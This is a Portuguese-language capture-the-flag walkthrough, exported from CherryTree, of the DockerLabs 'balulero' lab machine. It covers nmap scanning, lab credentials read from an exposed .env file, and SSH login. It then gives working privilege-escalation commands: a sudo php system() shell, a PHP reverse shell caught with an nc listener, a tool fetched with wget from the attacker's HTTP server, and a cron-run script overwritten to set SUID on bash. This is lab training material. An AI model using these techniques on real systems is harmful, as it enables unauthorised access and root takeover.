<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.balulero</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.balulero</h1><br/><p>                                      </p><p>                                      </p><p>                                      <img src="images/18-1.png" alt="images/18-1.png" /></p><p>                                      </p><p>                                        <strong><span style="color:#ff0000;"> </span></strong><strong><h1>DockerLabs Vacaciones</h1></strong></p><p></p><p>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</p><p>  </p><p>Baixamos o arquivo da página <a href="https://dockerlabs.es/">https://dockerlabs.es/</a></p><p></p><p>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</p><p></p><p>                                     <img src="images/18-2.png" alt="images/18-2.png" /></p><p>                                     </p><p>                                     </p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong></p><p></p><p><span style="color:#ff7800;">nmap 172.17.0.2 -sS -sV -sC  --open -p- -T5 -n -Pn          </span>                      </p><p>                                                        </p><p>Verificando as portas podemos ver que temos duas postas abertas  a 22 e a 80.                                    </p><p>                                     </p><p>                                     <img src="images/18-3.png" alt="images/18-3.png" /></p><p>                                     </p><p><strong><span style="color:#ff0000;">EXPLICAÇÃO DO COMANDO NMAP </span></strong></p><p>                                     </p><p>                                     <img src="images/18-4.png" alt="images/18-4.png" /></p><p>                                     </p><p><strong><span style="color:#ff0000;">PORTAS ABERTA</span></strong>:</p><p></p><p>. 22/tcp open  ssh     OpenSSH 8.2p1</p><p>. 80/tcp open  http    Apache httpd 2.4.41</p><p></p><p>agora vamos no navegador web e digitar o ip da maquina “vitima”. <a href="http://172.17.0.2/#skills">http://172.17.0.2/#skills</a></p><p></p><p>possivel usuário <strong><span style="color:#ff7800;">balu </span></strong>                      </p><p>                                         </p><p>                                       <img src="images/18-5.png" alt="images/18-5.png" />                                                                       </p><p> <strong><span style="color:#ff0000;">vamos acessar o código fonte da página</span></strong> <strong><span style="color:#ff7800;">Ctrl+U</span></strong>: view-source:<a href="http://172.17.0.2/#skills">http://172.17.0.2/#skills</a></p><p> </p><p>                                    <img src="images/18-6.png" alt="images/18-6.png" /> </p><p></p><p>vamos entra nesse <strong><span style="color:#ff7800;">“script.js”: </span></strong>   view-source:<a href="http://172.17.0.2/script.js">http://172.17.0.2/script.js</a></p><p></p><p>na imagem abaixo temos uma frase importante, que pode ter uma senha nos arquivo ( <strong><span style="color:#ff7800;">“.env “</span></strong>  ou no <strong><span style="color:#ff7800;">”.env_de_baluchingon&quot;</span></strong> ).   </p><p></p><p>  		                                             						<img src="images/18-7.png" alt="images/18-7.png" />    </p><p>  </p><p>    </p><p><strong><h1>INTRUSÃO</h1></strong></p><p></p><p><h3>Se entrarmos no arquivo </h3><h3>http://172.17.0.2/.env_de_baluchingon</h3><h3> do navegador, veremos o seguinte:</h3></p><p>RECOVERY LOGIN</p><p>           </p><p>                                      <img src="images/18-8.png" alt="images/18-8.png" /></p><p><strong><span style="color:#ff0000;">usuário</span></strong>: <span style="color:#ff7800;">balu</span></p><p><strong><span style="color:#ff0000;">senha</span></strong>: <strong><span style="color:#ff7800;">balubalulerobalulei</span></strong></p><p></p><p><h3>Parece que são credenciais para o ssh, porque simplesmente nos conectamos  ssh balu@172.17.0.2 e você estará dentro.</h3></p><p></p><p><strong><h1>ESCALADA DE PRIVILÉGIOS</h1></strong></p><p></p><p></p><p>conseguimos entrar no ssh com o usuário balu</p><p>                                     <img src="images/18-9.png" alt="images/18-9.png" /></p><p></p><p>O<h3> usuário </h3><strong><h3>balu</h3></strong><h3>, veremos que podemos executar </h3><code><h3>php</h3></code><h3>como o usuário chocolate ao executar </h3><strong><code><h3>sudo -l</h3></code></strong><strong><h3>:</h3></strong></p><p>                       </p><p>                                      <img src="images/18-10.png" alt="images/18-10.png" /> </p><p></p><p><strong><span style="color:#ff0000;">DESCRIÇÃO DETALHADA</span></strong> <span style="color:#ff7800;">sudo -l</span>    </p><p></p><p>                                     <img src="images/18-11.png" alt="images/18-11.png" />                                   </p><p>     </p><p><strong><span style="color:#ff0000;">EXEMPLO 1</span></strong>: para entrar no usuário chocolate     </p><p>                            </p><p>depois de pesquisar <a href="https://gtfobins.github.io/">GTFOBins</a> , vejo que podemos fazer o login no usuário chocolate da seguinte maneira:</p><p>                                      	</p><p><img src="images/18-12.png" alt="images/18-12.png" />    </p><p></p><p><strong><span style="color:#ff7800;">CMD=&quot;/bin/bash&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">sudo -u chocolate php -r &quot;system(&#39;$CMD&#39;);&quot;</span></strong></p><p></p><p>conseguimos fazer o login chocolate</p><p></p><p><img src="images/18-13.png" alt="images/18-13.png" /></p><p></p><p><strong><span style="color:#ff0000;">EXEMPLO 2</span></strong>: para entrar no usuário chocolate</p><p></p><p><strong><span style="color:#ff0000;">uma outra opçao para ser o usuário chocolate é</span></strong>:</p><p></p><p>baixar uma reverse shell php no <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php#L1">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php#L1</a>. crie um arquivo no nome que voce quiser por exemplo, “nano virus.reverse.php” é so copiar e colar.</p><p></p><p><img src="images/18-14.png" alt="images/18-14.png" /></p><p></p><p><img src="images/18-15.png" alt="images/18-15.png" /></p><p></p><p><strong><span style="color:#ff7800;">configure a reverse shell com seu ip e uma porta da sua preferencia. </span></strong></p><p><img src="images/18-16.png" alt="images/18-16.png" /></p><p></p><p>na máquina atacante deixe uma escuta com <strong><span style="color:#ff7800;">nc -lvnp 4444</span></strong></p><p><img src="images/18-17.png" alt="images/18-17.png" /></p><p></p><p>agora na maquina vitima é só executar o “<strong><span style="color:#ff7800;">sudo -u chocolate /usr/bin/php virus.reverse.php</span></strong>”.</p><p></p><p><img src="images/18-18.png" alt="images/18-18.png" /></p><p></p><p>-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</p><p></p><p>Agora não teremos sorte com isso <code>sudo -l</code>, mas depois de usar a ferramenta <a href="https://github.com/DominicBreuker/pspy">pspy</a> , posso ver que existe um comando que é executado a cada 5 segundos:</p><p></p><p>wget <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><p></p><p><img src="images/18-19.png" alt="images/18-19.png" /></p><p></p><p><img src="images/18-20.png" alt="images/18-20.png" /></p><p></p><p>vamos baixar uma reverse shell php para ser <strong><span style="color:#ff7800;">root</span></strong> do site: <a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p></p><p><img src="images/18-21.png" alt="images/18-21.png" /></p><p></p><p><img src="images/18-22.png" alt="images/18-22.png" /></p><p></p><p><strong><span style="color:#ff7800;">somos root</span></strong></p><p></p><p></p><p><strong><span style="color:#ff0000;">OUTRO EXEMPLO DE SER ROOT</span></strong></p><p>                            </p><p>depois de pesquisar <a href="https://gtfobins.github.io/">GTFOBins</a> , vejo que podemos fazer o login no usuário chocolate da seguinte maneira:</p><p>                                      	</p><p><img src="images/18-23.png" alt="images/18-23.png" />    </p><p></p><p><strong><span style="color:#ff7800;">CMD=&quot;/bin/bash&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">sudo -u chocolate php -r &quot;system(&#39;$CMD&#39;);&quot;</span></strong></p><p></p><p>conseguimos fazer o login chocolate</p><p></p><p><img src="images/18-24.png" alt="images/18-24.png" /></p><p></p><p>Agora não teremos sorte com isso <code>sudo -l</code>, mas depois de usar a ferramenta <a href="https://github.com/DominicBreuker/pspy">pspy</a> , posso ver que existe um comando que é executado a cada 5 segundos:</p><p></p><p><strong><span style="color:#ff7800;">vamos transferir a ferramenta </span></strong><strong><span style="color:#1c71d8;">pspy</span></strong><strong><span style="color:#ff7800;"> da maquina atacante, para a vitima.</span></strong></p><p></p><p><strong><span style="color:#ff7800;">máquina atacante iniciar o servidor</span></strong> <strong><span style="color:#1c71d8;">python3 -m http.server 8080</span></strong></p><p></p><p><img src="images/18-25.png" alt="images/18-25.png" /></p><p></p><p><strong><span style="color:#ff7800;">máquina vitima</span></strong>: wget <a href="http://192.168.0.24:8080/pspy64">http://192.168.0.24:8080/pspy64</a></p><p></p><p><img src="images/18-26.png" alt="images/18-26.png" /></p><p></p><p>Aparentemente, o processo executa de vez em quando o script que está em <code>/opt/script.php</code>, que podemos modificar casualmente, então agora só temos que executar o seguinte:</p><p></p><p></p><p><img src="images/18-27.png" alt="images/18-27.png" /></p><p></p><p>Depois que os 3 comandos estiver executado, </p><p>teremos apenas que esperar cerca de 5 segundos e depois executar, <code>bash -p</code> pois com o novo script que criamos demos 	permissão SUID para bash:</p><p></p><p><strong><span style="color:#ff7800;">echo &quot;&lt;?php&quot; &gt; /opt/script.php</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">echo &quot;exec (&#39;chmod u+s /bin/bash&#39;);&quot; &gt;&gt; /opt/script.php</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">echo &quot;?&gt;&quot; &gt;&gt; /opt/script.php</span></strong></p><p></p><p><img src="images/18-28.png" alt="images/18-28.png" /></p><p></p><p><strong><span style="color:#ff7800;">somos root.</span></strong></p><p></p><p><strong><span style="color:#ff0000;text-decoration:line-through;">bobmarley</span></strong></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>                               </p><p></p></div>
</body>
</html>
